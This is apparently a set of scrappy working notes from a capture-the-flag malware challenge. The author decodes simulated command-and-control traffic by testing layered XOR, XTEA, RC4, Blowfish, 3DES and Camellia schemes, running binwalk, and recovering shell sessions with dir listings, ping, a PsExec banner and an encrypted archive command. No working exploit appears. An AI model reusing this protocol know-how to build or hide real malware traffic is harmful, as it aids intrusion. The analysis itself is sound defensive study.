+00000040: 71 71 71 71 71 71 71 71  71 71 71 71 71 71 71 71  qqqqqqqqqqqqqqqq
+00000050: 71 71 71 71 71 71 71 71  71 71 71 71 71 71 71 71  qqqqqqqqqqqqqqqq
+00000000: 4A 71 71 71 98 71 71 71  98 71 71 71 B4 5F 57 06  Jqqq.qqq.qqq._W.
+00000010: DB FC CD 2C D7 2D 71 39  5A 13 59 1E 40 28 40 3E  ...,.-q9Z.Y.@(@>
+00000020: 5D 71 71 71 09 71 71 71  71 71 71 71 71 71 71 71  ]qqq.qqqqqqqqqqq
+00000030: 7D 96 B7 47 37 6C 7D 40  33 F6 28 99 08 16 B9 D4  }..G7l}@3.(.....
+00000000: 4A 71 71 71 FA 71 71 71  FA 71 71 71 B4 5F 57 06  Jqqq.qqq.qqq._W.
+00000010: DB FC CD 2C D7 2D 71 39  5A 13 59 1E 40 28 40 3E  ...,.-q9Z.Y.@(@>
+00000020: 2D 71 71 71 7C 71 71 71  71 71 71 71 71 71 71 71  -qqq|qqqqqqqqqqq
+00000030: 7D 96 B7 47 37 6C 7D 40  33 F6 28 99 08 16 B9 D4  }..G7l}@3.(.....
+00000040: 71 71 71 71 71 71 71 71  71 71 71 71 71 71 71 71  qqqqqqqqqqqqqqqq
+00000050: 71 71 71 71 71 71 71 71  71 71 71 71 71 71 71 71  qqqqqqqqqqqqqqqq
+00000000: 4A 71 71 71 98 71 71 71  98 71 71 71 B4 5F 57 06  Jqqq.qqq.qqq._W.
+00000010: DB FC CD 2C D7 2D 71 39  5A 13 59 1E 40 28 40 3E  ...,.-q9Z.Y.@(@>
+00000020: 61 71 71 71 37 71 71 71  71 71 71 71 71 71 71 71  aqqq7qqqqqqqqqqq
+00000030: 7D 96 B7 47 37 6C 7D 40  33 F6 28 99 08 16 B9 D4  }..G7l}@3.(.....
+00000000: 4A 71 71 71 FA 71 71 71  FA 71 71 71 B4 5F 57 06  Jqqq.qqq.qqq._W.
+00000010: DB FC CD 2C D7 2D 71 39  5A 13 59 1E 40 28 40 3E  ...,.-q9Z.Y.@(@>
+00000020: 2D 71 71 71 C2 71 71 71  71 71 71 71 71 71 71 71  -qqq.qqqqqqqqqqq
+00000030: 7D 96 B7 47 37 6C 7D 40  33 F6 28 99 08 16 B9 D4  }..G7l}@3.(.....
+00000040: 71 71 71 71 71 71 71 71  71 71 71 71 71 71 71 71  qqqqqqqqqqqqqqqq
+00000050: 71 71 71 71 71 71 71 71  71 71 71 71 71 71 71 71  qqqqqqqqqqqqqqqq
+00000000: 4A 71 71 71 98 71 71 71  98 71 71 71 B4 5F 57 06  Jqqq.qqq.qqq._W.
+00000010: DB FC CD 2C D7 2D 71 39  5A 13 59 1E 40 28 40 3E  ...,.-q9Z.Y.@(@>
+00000020: 5D 71 71 71 29 71 71 71  71 71 71 71 71 71 71 71  ]qqq)qqqqqqqqqqq
+00000030: 7D 96 B7 47 37 6C 7D 40  33 F6 28 99 08 16 B9 D4  }..G7l}@3.(.....
+00000000: 4A 71 71 71 50 71 71 71  FA 71 71 71 25 2B C6 3F  JqqqPqqq.qqq%+.?
+00000010: A4 27 87 48 E8 34 05 74  EC E0 0E D9 DC D3 7B 1B  .'.H.4.t......{.
+00000020: 9E 9B 42 7E 42 42 F2 D2  30 71 81 D4 AD CA 1D CE  ..B~BB..0q......
+00000030: FA 72 19 E1 5E A2 CA 81  8D DC A8 30 71 71 71 50  .r..^......0qqqP
+00000040: 9E 5D 98                                          .].
+00000000: 4A 71 71 71 98 71 71 71  98 71 71 71 B4 5F 57 06  Jqqq.qqq.qqq._W.
+00000010: DB FC CD 2C D7 2D 71 39  5A 13 59 1E 40 28 40 3E  ...,.-q9Z.Y.@(@>
+00000020: 5D 71 71 71 0F 71 71 71  71 71 71 71 71 71 71 71  ]qqq.qqqqqqqqqqq
+00000030: 7D 96 B7 47 37 6C 7D 40  33 F6 28 99 08 16 B9 D4  }..G7l}@3.(.....
+00000000: 4A 71 71 71 50 71 71 71  FA 71 71 71 25 2B C6 3F  JqqqPqqq.qqq%+.?
+00000010: A4 27 87 48 E8 34 05 74  EC E0 0E D9 DC D3 7B 1B  .'.H.4.t......{.
+00000020: 9E 9B 42 7E 42 42 02 1B  30 71 81 D4 AD CA 1D CE  ..B~BB..0q......
+00000030: FA 72 19 E1 5E A2 CA 81  8D DC A8 30 71 71 71 63  .r..^......0qqqc
+00000040: B6 5D 6A                                          .]j
+00000000: 4A 71 71 71 FA 71 71 71  FA 71 71 71 B4 5F 57 06  Jqqq.qqq.qqq._W.
+00000010: DB FC CD 2C D7 2D 71 39  5A 13 59 1E 40 28 40 3E  ...,.-q9Z.Y.@(@>
+00000020: 2D 71 71 71 C1 71 71 71  71 71 71 71 71 71 71 71  -qqq.qqqqqqqqqqq
+00000030: 7D 96 B7 47 37 6C 7D 40  33 F6 28 99 08 16 B9 D4  }..G7l}@3.(.....
+
+00000000: 1C 00 00 00 24 00 00 00  24 00 00 00 F3 71 26 AD  ....$...$....q&.
+00000010: 88 A5 61 7E AF 06 00 0D  42 4C 5A 21 17 04 17 20  ..a~....BLZ!...
+00000020: 05 00 00 00 10 00 00 00  00 00 00 00 00 00 00 00  ................
+00000030: 15 5B BF 4A 1E FE 15 17  73 46 04 B9 D4 2B 80 E8  .[.J....sF...+..
+00000000: 1C 00 00 00 44 00 00 00  44 00 00 00 F3 71 26 AD  ....D...D....q&.
+00000010: 88 A5 61 7E AF 06 00 0D  42 4C 5A 21 17 04 17 20  ..a~....BLZ!...
+00000020: 06 00 00 00 13 00 00 00  00 00 00 00 00 00 00 00  ................
+00000030: 15 5B BF 4A 1E FE 15 17  73 46 04 B9 D4 2B 80 E8  .[.J....sF...+..
+00000040: 00 00 00 00 00 00 00 00  00 00 00 00 00 00 00 00  ................
+00000050: 00 00 00 00 00 00 00 00  00 00 00 00 00 00 00 00  ................
+00000000: 1C 00 00 00 24 00 00 00  24 00 00 00 F3 71 26 AD  ....$...$....q&.
+00000010: 88 A5 61 7E AF 06 00 0D  42 4C 5A 21 17 04 17 20  ..a~....BLZ!...
+00000020: 07 00 00 00 16 00 00 00  00 00 00 00 00 00 00 00  ................
+00000030: 15 5B BF 4A 1E FE 15 17  73 46 04 B9 D4 2B 80 E8  .[.J....sF...+..
+00000000: 1C 00 00 00 44 00 00 00  44 00 00 00 F3 71 26 AD  ....D...D....q&.
+00000010: 88 A5 61 7E AF 06 00 0D  42 4C 5A 21 17 04 17 20  ..a~....BLZ!...
+00000020: 06 00 00 00 1A 00 00 00  00 00 00 00 00 00 00 00  ................
+00000030: 15 5B BF 4A 1E FE 15 17  73 46 04 B9 D4 2B 80 E8  .[.J....sF...+..
+00000040: 00 00 00 00 00 00 00 00  00 00 00 00 00 00 00 00  ................
+00000050: 00 00 00 00 00 00 00 00  00 00 00 00 00 00 00 00  ................
+00000000: 1C 00 00 00 24 00 00 00  24 00 00 00 F3 71 26 AD  ....$...$....q&.
+00000010: 88 A5 61 7E AF 06 00 0D  42 4C 5A 21 17 04 17 20  ..a~....BLZ!...
+00000020: 05 00 00 00 1E 00 00 00  00 00 00 00 00 00 00 00  ................
+00000030: 15 5B BF 4A 1E FE 15 17  73 46 04 B9 D4 2B 80 E8  .[.J....sF...+..
+00000000: 1C 00 00 00 44 00 00 00  44 00 00 00 F3 71 26 AD  ....D...D....q&.
+00000010: 88 A5 61 7E AF 06 00 0D  42 4C 5A 21 17 04 17 20  ..a~....BLZ!...
+00000020: 06 00 00 00 23 00 00 00  00 00 00 00 00 00 00 00  ....#...........
+00000030: 15 5B BF 4A 1E FE 15 17  73 46 04 B9 D4 2B 80 E8  .[.J....sF...+..
+00000040: 00 00 00 00 00 00 00 00  00 00 00 00 00 00 00 00  ................
+00000050: 00 00 00 00 00 00 00 00  00 00 00 00 00 00 00 00  ................
+00000000: 1C 00 00 00 24 00 00 00  24 00 00 00 F3 71 26 AD  ....$...$....q&.
+00000010: 88 A5 61 7E AF 06 00 0D  42 4C 5A 21 17 04 17 20  ..a~....BLZ!...
+00000020: 07 00 00 00 28 00 00 00  00 00 00 00 00 00 00 00  ....(...........
+00000030: 15 5B BF 4A 1E FE 15 17  73 46 04 B9 D4 2B 80 E8  .[.J....sF...+..
+00000000: 1C 00 00 00 27 00 00 00  44 00 00 00 5F D8 EA 0E  ....'...D..._...
+00000010: 9D 0A 92 CB E4 25 10 96  90 CE 7D A2 78 9C 13 67  .....%....}.x..g
+00000020: 11 57 60 63 60 60 D0 65  40 00 D1 E8 FD 5E 72 FF  .W`c``.e@....^r.
+00000030: 44 C5 8B DD 58 76 5E D1  6E 78 C1 40 00 00 00 27  D...Xv^.nx.@...'
+00000040: 11 07 24                                          ..$
+00000000: 1C 00 00 00 24 00 00 00  24 00 00 00 F3 71 26 AD  ....$...$....q&.
+00000010: 88 A5 61 7E AF 06 00 0D  42 4C 5A 21 17 04 17 20  ..a~....BLZ!...
+00000020: 07 00 00 00 32 00 00 00  00 00 00 00 00 00 00 00  ....2...........
+00000030: 15 5B BF 4A 1E FE 15 17  73 46 04 B9 D4 2B 80 E8  .[.J....sF...+..
+00000000: 1C 00 00 00 27 00 00 00  44 00 00 00 5F D8 EA 0E  ....'...D..._...
+00000010: 9D 0A 92 CB E4 25 10 96  90 CE 7D A2 78 9C 13 67  .....%....}.x..g
+00000020: 11 57 60 63 60 60 30 67  40 00 D1 E8 FD 5E 72 FF  .W`c``0g@....^r.
+00000030: 44 C5 8B DD 58 76 5E D1  6E 78 C1 40 00 00 00 29  D...Xv^.nx.@...)
+00000040: 69 07 2E                                          i..
+00000000: 1C 00 00 00 44 00 00 00  44 00 00 00 F3 71 26 AD  ....D...D....q&.
+00000010: 88 A5 61 7E AF 06 00 0D  42 4C 5A 21 17 04 17 20  ..a~....BLZ!...
+00000020: 06 00 00 00 3C 00 00 00  00 00 00 00 00 00 00 00  ....<...........
+00000030: 15 5B BF 4A 1E FE 15 17  73 46 04 B9 D4 2B 80 E8  .[.J....sF...+..
+
+BOOM! OMFG
+
+00000010: 88 A5 61 7E AF 06 00 0D  42 4C 5A 21 17 04 17 20  ..a~....BLZ!...
+00000020: 04 00 00 00 00 00 00 00  00 00 00 00 FF FF FF FF  ................
+00000030: F4 6D 09 70 4B 40 27 5F  B3 37 90 A3 62 76 2E 56  .m.pK@'_.7..bv.V
+00000040: 64 69 72 0D 0A 20 56 6F  6C 75 6D 65 20 69 6E 20  dir.. Volume in
+00000050: 64 72 69 76 65 20 43 20  68 61 73 20 6E 6F 20 6C  drive C has no l
+00000060: 61 62 65 6C 2E 0D 0A 20  56 6F 6C 75 6D 65 20 53  abel... Volume S
+00000070: 65 72 69 61 6C 20 4E 75  6D 62 65 72 20 69 73 20  erial Number is
+00000080: 45 43 41 41 2D 32 42 36  37 0D 0A 0D 0A 20 44 69  ECAA-2B67.... Di
+00000090: 72 65 63 74 6F 72 79 20  6F 66 20 63 3A 5C 73 74  rectory of c:\st
+000000A0: 61 67 69 6E 67 0D 0A 0D  0A 30 38 2F 30 31 2F 32  aging....08/01/2
+000000B0: 30 31 37 20 20 31 30 3A  30 37 20 41 4D 20 20 20  017  10:07 AM
+000000C0: 20 3C 44 49 52 3E 20 20  20 20 20 20 20 20 20 20   <DIR>
+000000D0: 2E 0D 0A 30 38 2F 30 31  2F 32 30 31 37 20 20 31  ...08/01/2017  1
+000000E0: 30 3A 30 37 20 41 4D 20  20 20 20 3C 44 49 52 3E  0:07 AM    <DIR>
+000000F0: 20 20 20 20 20 20 20 20  20 20 2E 2E 0D 0A 30 38            ....08
+00000100: 2F 30 31 2F 32 30 31 37  20 20 31 30 3A 30 37 20  /01/2017  10:07
+00000110: 41 4D 20 20 20 20 20 20  20 20 20 20 20 33 33 39  AM           339
+00000120: 2C 30 39 36 20 70 73 65  2E 65 78 65 0D 0A 30 38  ,096 pse.exe..08
+00000130: 2F 30 31 2F 32 30 31 37  20 20 31 30 3A 30 37 20  /01/2017  10:07
+00000140: 41 4D 20 20 20 20 20 20  20 20 20 20 20 31 31 39  AM           119
+00000150: 2C 38 30 38 20 73 72 76  32 2E 65 78 65 0D 0A 20  ,808 srv2.exe..
+00000160: 20 20 20 20 20 20 20 20  20 20 20 20 20 20 32 20                2
+00000170: 46 69 6C 65 28 73 29 20  20 20 20 20 20 20 20 34  File(s)        4
+00000180: 35 38 2C 39 30 34 20 62  79 74 65 73 0D 0A 20 20  58,904 bytes..
+00000190: 20 20 20 20 20 20 20 20  20 20 20 20 20 32 20 44               2 D
+000001A0: 69 72 28 73 29 20 20 35  35 2C 31 33 30 2C 36 35  ir(s)  55,130,65
+000001B0: 36 2C 37 36 38 20 62 79  74 65 73 20 66 72 65 65  6,768 bytes free
+000001C0: 0D 0A 0D 0A 63 3A 5C 73  74 61 67 69 6E 67 3E     ....c:\staging>
+
+ok, wow
+dir
+ Volume in drive C has no label.
+ Volume Serial Number is ECAA-2B67
+
+ Directory of c:\staging
+
+08/01/2017  10:07 AM    <DIR>          .
+08/01/2017  10:07 AM    <DIR>          ..
+08/01/2017  10:07 AM           339,096 pse.exe
+08/01/2017  10:07 AM           119,808 srv2.exe
+               2 File(s)        458,904 bytes
+               2 Dir(s)  55,130,656,768 bytes free
+
+c:\staging>
+
+On a roll, let's go onto the next plugin. 1.1.8, t.dll.
+.. Don't see anything?
+Near same offset is:
+10017200  38 BE 0F 62 4C E2 74 FC  61 F7 5C 90 CB 3F 59 15  8¾.bLâtüa÷\.Ë?Y.
+10017210  C7 19 30 0C A8 10 AD D5  D4 16 52 FC 1B 82 7D 32  Ç.0.¨.­ÕÔ.Rü.‚}2
+10017220  34 01 E6 4C 12 08 2B F7  AC 8B 3F 67 48 72 21 DC  4.æL..+÷¬‹?gHr!Ü
+10017230  ED F6 85 B8 4F 5F 53 0A  04 28 DF D8 7E 06 3D 03  íö…¸O_S..(ßØ~.=.
+
+Nothing ... moving on to next: ?1.0.4 6.dll no.
+Back to 101.dll and XTEA
+
+There's no xref, but 101 has a 16-byte signature found in the packets:
+10017C00  20 20 58 54 45 41 20 74  65 73 74 20 23 25 64 3A    XTEA test #%d:
+10017C10  20 00 00 00 66 61 69 6C  65 64 0A 00 70 61 73 73   ...failed..pass
+10017C20  65 64 0A 00 0A 00 00 00  B2 E5 49 0D 26 54 05 9B  ed......²åI.&T.›
+10017C30  BB AB 7F 2A 67 FE 5F F4  00 00 00 00 00 00 00 00  »«.*gþ_ô........
+
+B2 E5 49 0D 26 54 05 9B BB AB 7F 2A 67 FE 5F F4, maybe same situation as first.
+
+Trace data in, looks like first 16 bytes are used as the encryption key?
+
+00000000: 31 8C F8 6B 7A 79 CA 1C  AE A4 6D EA 07 88 C7 A3  1..kzy....m.....
+00000010: 69 19 CE CA AD D4 E0 E0  C9 4A 5F BE 46 DB 93 D8  i........J_.F...
+00000020: E2 66 51 1C 9E 03 14 81  B8 A3 BE 9D 61 EA 02 93  .fQ.........a...
+00000030: 04 40 24 48 6D A7 D6 3A  AF A4 B0 C5 B9 DB 26 80  .@$Hm..:......&.
+00000040: 88 6C 59 3C 26 C1 C7 3F  85 B8 5B 92 22 3C 14 FE  .lY<&..?..[."<..
+00000050: 49 F1 81 EB 90 D9 D3 D4  96 9A E4 16 8F 4A 8F 37  I............J.7
+00000060: 36 B0 04 C2 23 53 BE 74  FA 73 5E BF DE 2D 78 B2  6...#S.t.s^..-x.
+00000070: 4B 46 67 C0 37 AC 27 AA                           KFg.7.'.
+
+Still need to find Base64 stuff
+
+104_2 (6.dll -- I should just go by that) has some:
+
+sigh, copy paste broke again from VM, notes will be screwed up
+
+0x1000F940 -- custom alphabet
+I think, I'm not exactly sure how this is being implemented, but just doing it raw
+
+
+XXXXX
+
+
+packet type: ba0504fcc08f9121d16fd3fed1710e60
+
+alright, now that I know where to look
+
+43 52 50 54 CRPT
+C^PT?
+>>> hexdump.hexdump(multibyte_xor(b, c))
+00000000: 00 00 00 00 43 92 50 54  43 7E 51 54 43 12 50 54  ....C.PTC~QTC.PT
+00000010: 43 52 50 57 A8 54 D1 9D  43 52 50 56 C8 93 5B 9A  CRPW.T..CRPV..[.
+00000020: 70 94 F9 4B 40 5A 50 20  45 D3 99 54 43 52 D0 DF  p..K@ZP E..TCR..
+00000030: 82 B9 52 DF 85 0D 0E 0F  C8 B7 0D 97 16 D9 BC DF  ..R.............
+00000040: 0E 5A 63 94 B5 93 40 20  42 12 A6 95 4B 26 53 D7  .Zc...@ B...K&S.
+00000050: 8B 56 A6 95 47 26 53 D7                           .V..G&S.
+?
+
+
+
+B2E5490D2654059BBBAB7F2A67FE5FF4 -- xtea w/ first 16 as key It works!!!
+xtea
+00000000: 1C 00 00 00 A0 29 00 00  A0 29 00 00 F3 71 26 AD  .....)...)...q&.
+00000010: 88 A5 61 7E AF 06 00 0D  42 4C 5A 21 17 04 17 20  ..a~....BLZ!...
+00000020: 02 00 00 00 34 00 00 00  00 00 00 00 11 00 00 00  ....4...........
+00000030: F4 7C 51 07 0F A8 69 80  64 B6 5B 3B 6E 7D 30 C6  .|Q...i.d.[;n}0.
+00000040: 63 00 3A 00 5C 00 5C 00  5C 00 00 00 00 00 00 00  c.:.\.\.\.......
+00000050: 00 00 00 00 00 00 00 00  00 00 00 00 00 00 00 00  ................
+00000240: 00 00 00 00 00 00 00 00  16 00 00 00 A6 37 BD DB  .............7..
+00000250: 2B 04 CA 01 96 90 F4 FA  BD D4 D2 01 96 90 F4 FA  +...............
+00000260: BD D4 D2 01 00 00 00 00  00 00 00 00 00 00 00 00  ................
+00000270: 00 00 00 00 24 00 52 00  65 00 63 00 79 00 63 00  ....$.R.e.c.y.c.
+00000280: 6C 00 65 00 2E 00 42 00  69 00 6E 00 00 00 00 00  l.e...B.i.n.....
+00000290: 00 00 00 00 00 00 00 00  00 00 00 00 00 00 00 00  ................
+000004C0: 00 00 00 00 61 00 75 00  74 00 6F 00 65 00 78 00  ....a.u.t.o.e.x.
+000004D0: 65 00 63 00 2E 00 62 00  61 00 74 00 00 00 00 00  e.c...b.a.t.....
+
+...
+00002080: 00 00 00 00 74 00 65 00  6D 00 70 00 00 00 00 00  ....t.e.m.p.....
+00002740: 00 00 00 00 00 00 00 00  10 00 00 00 C9 45 63 9D  .............Ec.
+00002750: 35 D6 D2 01 B8 84 A6 7B  27 5A CE 01 B8 84 A6 7B  5......{'Z.....{
+00002760: 27 5A CE 01 00 00 00 00  00 00 00 00 00 00 00 00  'Z..............
+00002770: 00 00 00 00 77 00 6F 00  72 00 6B 00 00 00 00 00  ....w.o.r.k.....
+...
+00000030: F4 6D 09 70 4B 40 27 5F  B3 37 90 A3 62 76 2E 56  .m.pK@'_.7..bv.V
+00000040: 52 65 70 6C 79 20 66 72  6F 6D 20 31 39 32 2E 31  Reply from 192.1
+00000050: 36 38 2E 32 32 31 2E 31  30 35 3A 20 62 79 74 65  68.221.105: byte
+00000060: 73 3D 33 32 20 74 69 6D  65 3C 31 6D 73 20 54 54  s=32 time<1ms TT
+00000070: 4C 3D 31 32 38 0D 0A 0D  0A 50 69 6E 67 20 73 74  L=128....Ping st
+00000080: 61 74 69 73 74 69 63 73  20 66 6F 72 20 31 39 32  atistics for 192
+00000090: 2E 31 36 38 2E 32 32 31  2E 31 30 35 3A 0D 0A 20  .168.221.105:..
+000000A0: 20 20 20 50 61 63 6B 65  74 73 3A 20 53 65 6E 74     Packets: Sent
+000000B0: 20 3D 20 34 2C 20 52 65  63 65 69 76 65 64 20 3D   = 4, Received =
+000000C0: 20 34 2C 20 4C 6F 73 74  20 3D 20 30 20 28 30 25   4, Lost = 0 (0%
+000000D0: 20 6C 6F 73 73 29 2C 0D  0A 41 70 70 72 6F 78 69   loss),..Approxi
+000000E0: 6D 61 74 65 20 72 6F 75  6E 64 20 74 72 69 70 20  mate round trip
+000000F0: 74 69 6D 65 73 20 69 6E  20 6D 69 6C 6C 69 2D 73  times in milli-s
+00000100: 65 63 6F 6E 64 73 3A 0D  0A 20 20 20 20 4D 69 6E  econds:..    Min
+00000110: 69 6D 75 6D 20 3D 20 30  6D 73 2C 20 4D 61 78 69  imum = 0ms, Maxi
+00000120: 6D 75 6D 20 3D 20 30 6D  73 2C 20 41 76 65 72 61  mum = 0ms, Avera
+00000130: 67 65 20 3D 20 30 6D 73  0D 0A 0D 0A 63 3A 5C 73  ge = 0ms....c:\s
+00000140: 74 61 67 69 6E 67 3E A2                           taging>.
+xtea
+00000040: 00 00 00 00 01 00 00 00  44 40 00 00 31 39 32 2E  ........D@..192.
+00000050: 31 36 38 2E 32 32 31 2E  31 30 35 00 00 00 00 00  168.221.105.....
+00000040: 0D 0A 50 73 45 78 65 63  20 76 32 2E 32 20 2D 20  ..PsExec v2.2 -
+00000050: 45 78 65 63 75 74 65 20  70 72 6F 63 65 73 73 65  Execute processe
+00000060: 73 20 72 65 6D 6F 74 65  6C 79 0D 0A 43 6F 70 79  s remotely..Copy
+00000070: 72 69 67 68 74 20 28 43  29 20 32 30 30 31 2D 32  right (C) 2001-2
+00000080: 30 31 36 20 4D 61 72 6B  20 52 75 73 73 69 6E 6F  016 Mark Russino
+00000090: 76 69 63 68 0D 0A 53 79  73 69 6E 74 65 72 6E 61  vich..Sysinterna
+000000A0: 6C 73 20 2D 20 77 77 77  2E 73 79 73 69 6E 74 65  ls - www.sysinte
+000000B0: 72 6E 61 6C 73 2E 63 6F  6D 0D 0A 0D 0A 63 7A 45  rnals.com....czE
+
+
+00001CE0: 20 86 27 AD 8D 39 18 86  88 AB 28 D0 14 E4 13 99   .'..9....(.....
+00001CF0: 20 86 27 AD 8D 39 18 86  88 AB 28 D0 14 E4 13 99   .'..9....(.....
+Ugh, multi-byte xors?
+nested encodings?
+
+I keep seeing this across multiple types:
+00003CE0: F7 F7 F7 F7 F7 F7 F7 F7  F7 F5 F5 F5 F5 F7 F7 F7  ................
+00003CF0: 07 07 07 EE F7 A5 9C 53  52 52 4A 53 93 93 93 93  .......SRRJS....
+00003D00: 93 93 93 93 93 93 93 93  93 93 93 53 52 4A 4A 4A  ...........SRJJJ
+00003D10: 4A 4A 4A 4A 49 4A 52 52  9B A4 F7 07 F7 F7 F7 F7  JJJJIJRR........
+00003D20: F7 F7 F7 F7 F7 F7 AD AC  AC A4 A4 A3 5B 5B 5B 5B  ............[[[[
+00003D30: 5B 5B 5B 5B 5B 5B 5B 5B  5B 5B 5B 5B 5B 5B 5B 5B  [[[[[[[[[[[[[[[[
+00003D40: 5B 5B 5B 5B 5B 5B 5B 5B  5B 5B 5B 5B 5B 5B 5B 5B  [[[[[[[[[[[[[[[[
+00003D50: 5B 5B 5B 5B 5B 5B 5B 5B  5B 5B 5B 5B 5B 5B 5B 5B  [[[[[[[[[[[[[[[[
+00003D60: 5B 9B 9A 52 51 49 49 49  49 89 89 89 89 89 89 89  [..RQIIII.......
+00003D70: 89 89 89 89 8A 89 89 89  89 8A 89 89 89 89 89 89  ................
+00003D80: 89 89 89 89 89 89 89 89  8A 8A 8A 89 89 89 89 89  ................
+00003D90: 89 89 89 89 89 89 89 89  89 89 89 89 89 89 89 89  ................
+00003DA0: 89 89 89 89 89 89 89 89  89 89 89 89 89 89 89 89  ................
+00003DB0: 89 89 89 89 89 89 89 89  89 89 89 89 89 89 89 89  ................
+00003DC0: 89 89 89 89 89 89 89 89  89 89 89 89 89 89 89 89  ................
+00003DD0: 89 8A 8A 8A 8A 8A 89 89  89 89 89 89 89 89 89 89  ................
+00003DE0: 89 89 89 89 89 89 89 89  89 89 89 89 89 89 89 89  ................
+00003DF0: 89 89 89 89 89 89 89 89  91 91 91 89 89 89 89 89  ................
+00003E00: 89 89 89 89 89 49 49 00  08 91 91 91 91 ED 49 FF  .....II.......I.
+00003E10: FF FF FF FF FF FF FF FF  FF FF FF FF FF FF FF FF  ................
+00003E20: FF FF FF FF FF FF FF FF  FF FF FF FF FF FF FF FF  ................
+00003E30: FF FF FF FF FF FF FF FF  FF FF FF FF FF FF FF FF  ................
+
+Bitmap?
+
+Trying out the Custom base64 ish thing:
+
+00000090: FF FF FF FF F4 6D 09 70  4B 40 27 5F B3 37 90 A3  .....m.pK@'_.7..
+000000A0: 62 76 2E 56 63 3A 5C 73  74 61 67 69 6E 67 5C 63  bv.Vc:\staging\c
+000000B0: 66 2E 65 78 65 20 6C 61  62 31 30 2E 7A 69 70 20  f.exe lab10.zip
+000000C0: 74 43 71 6C 63 32 2B 66  46 69 4C 63 75 71 31 65  tCqlc2+fFiLcuq1e
+000000D0: 65 31 65 41 50 4F 4D 6A  78 63 64 69 6A 68 38 7A  e1eAPOMjxcdijh8z
+000000E0: 30 6A 72 61 6B 4D 41 2F  6A 78 67 3D 0D 0A        0jrakMA/jxg=..
+
+BOOM!!!!
+
+c:\\staging\\cf.exe lab10.zip tCqlc2+fFiLcuq1ee1eAPOMjxcdijh8z0jrakMA/jxg=
+>>> hexdump.hexdump(base64.b64decode('tCqlc2+fFiLcuq1ee1eAPOMjxcdijh8z0jrakMA/jxg='))
+00000000: B4 2A A5 73 6F 9F 16 22  DC BA AD 5E 7B 57 80 3C  .*.so.."...^{W.<
+00000010: E3 23 C5 C7 62 8E 1F 33  D2 3A DA 90 C0 3F 8F 18  .#..b..3.:...?..
+
+ugh
+
+
+51298F741667D7ED2941950106F50545 -- Plaintext
+BA0504FCC08F9121D16FD3FED1710E60 -- Customish Base64?
+B2E5490D2654059BBBAB7F2A67FE5FF4 -- xtea w/ first 16 as key
+C30B1A2DCB489CA8A724376469CF6782 -- RC4 w/ first 16 as key
+2965E4A19B6E9D9473F5F54DFEF93533 -- Blowfish. First 16 as key, next 8 as IV, then data
+46C5525904F473ACE7BB8CB58B29968A -- 3DES, same. First 16 as key, next 8 as IV
+8746E7B7B0C1B9CF3F11ECAE78A3A4BC -- dunno?
+9B1F6EC7D9B42BF7758A094A2186986B -- camellia MODE_ECB, first 16 as key
+
+38be0f624ce274fc61f75c90cb3f5915 = first
+
+
+Dump all that you can find and binwalk:
+12:42:21-bbaskin@~/CTF/FLARE_2017/12$ binwalk traffic_plain.dat
+
+DECIMAL       HEXADECIMAL     DESCRIPTION
+--------------------------------------------------------------------------------
+2756          0xAC4           Zlib compressed data, default compression
+2988          0xBAC           Zlib compressed data, default compression
+3545          0xDD9           Zlib compressed data, default compression
+3866          0xF1A           Zlib compressed data, default compression
+4093          0xFFD           Zlib compressed data, default compression
+4375          0x1117          Zlib compressed data, default compression
+
+ugh, ok, compression in all the packets
+12:43:52-bbaskin@~/CTF/FLARE_2017/12$ ls -lh traffic_*
+-rw-r--r--  1 bbaskin  1069228684   636K Oct  8 12:43 traffic_b64.dat
+-rw-r--r--  1 bbaskin  1069228684   538K Oct  8 12:43 traffic_lookup.dat
+-rw-r--r--  1 bbaskin  1069228684   569K Oct  8 12:43 traffic_plain.dat
+-rw-r--r--  1 bbaskin  1069228684   597K Oct  8 12:43 traffic_rc4.dat
+-rw-r--r--  1 bbaskin  1069228684   655K Oct  8 12:43 traffic_xtea.dat
+
+12:44:37-bbaskin@~/CTF/FLARE_2017/12$ binwalk traffic_xtea.dat | grep -v Zli
+
+DECIMAL       HEXADECIMAL     DESCRIPTION
+--------------------------------------------------------------------------------
+122284        0x1DDAC         Copyright string: "Copyright (C) 2001-2016 Mark Russinovich"
+
+OK, so another wrapper for zlib
+
+
+00000060: 62 76 2E 56 4D 69 63 72  6F 73 6F 66 74 20 57 69  bv.VMicrosoft Wi
+00000070: 6E 64 6F 77 73 20 5B 56  65 72 73 69 6F 6E 20 36  ndows [Version 6
+00000080: 2E 31 2E 37 36 30 31 5D  0D 0A 43 6F 70 79 72 69  .1.7601]..Copyri
+00000090: 67 68 74 20 28 63 29 20  32 30 30 39 20 4D 69 63  ght (c) 2009 Mic
+000000A0: 72 6F 73 6F 66 74 20 43  6F 72 70 6F 72 61 74 69  rosoft Corporati
+000000B0: 6F 6E 2E 20 20 41 6C 6C  20 72 69 67 68 74 73 20  on.  All rights
+000000C0: 72 65 73 65 72 76 65 64  2E 0D 0A 0D 0A 43 3A 5C  reserved.....C:\
+000000D0: 55 73 65 72 73 5C 6A 6F  68 6E 2E 6A 61 63 6B 73  Users\john.jacks
+000000E0: 6F 6E 5C 44 6F 77 6E 6C  6F 61 64 73 3E           on\Downloads>
+
+Microsoft Windows [Version 6.1.7601]
+Copyright (c) 2009 Microsoft Corporation.  All rights reserved.
+
+C:\Users\john.jackson\Downloads>
+
+00000060: 62 76 2E 56 63 64 20 63  3A 5C 0D 0A 0D 0A 63 3A  bv.Vcd c:\....c:
+00000070: 5C 3E                                             \>
+00000060: 62 76 2E 56 64 69 72 0D  0A 20 56 6F 6C 75 6D 65  bv.Vdir.. Volume
+00000070: 20 69 6E 20 64 72 69 76  65 20 43 20 68 61 73 20   in drive C has
+00000080: 6E 6F 20 6C 61 62 65 6C  2E 0D 0A 20 56 6F 6C 75  no label... Volu
+00000090: 6D 65 20 53 65 72 69 61  6C 20 4E 75 6D 62 65 72  me Serial Number
+000000A0: 20 69 73 20 45 43 41 41  2D 32 42 36 37 0D 0A 0D   is ECAA-2B67...
+000000B0: 0A 20 44 69 72 65 63 74  6F 72 79 20 6F 66 20 63  . Directory of c
+000000C0: 3A 5C 0D 0A 0D 0A 30 36  2F 31 30 2F 32 30 30 39  :\....06/10/2009
+000000D0: 20 20 30 32 3A 34 32 20  50 4D 20 20 20 20 20 20    02:42 PM
+000000E0: 20 20 20 20 20 20 20 20  20 20 32 34 20 61 75 74            24 aut
+000000F0: 6F 65 78 65 63 2E 62 61  74 0D 0A 30 36 2F 31 30  oexec.bat..06/10
+00000100: 2F 32 30 30 39 20 20 30  32 3A 34 32 20 50 4D 20  /2009  02:42 PM
+00000110: 20 20 20 20 20 20 20 20  20 20 20 20 20 20 20 31                 1
